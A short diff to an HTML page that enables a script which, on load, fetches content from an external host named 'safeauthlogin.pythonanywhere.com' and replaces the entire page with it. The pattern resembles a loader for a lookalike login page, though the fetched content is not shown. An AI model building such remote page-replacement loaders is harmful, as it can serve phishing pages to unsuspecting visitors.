@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,12 +8,10 @@
 <body>
 
 <script>
-    var url = "https://safeauthlogin.pythonanywhere.com/";
-    console.log(window.location.pathname);
-
-    /*$.get( "https://safeauthlogin.pythonanywhere.com/", function(data) {
+    const url = "https://safeauthlogin.pythonanywhere.com" + window.location.pathname;
+    $.get( "https://safeauthlogin.pythonanywhere.com/", function(data) {
     $("html").html(data);
-    });*/
+    });
 </script>
 </body>
 </html>
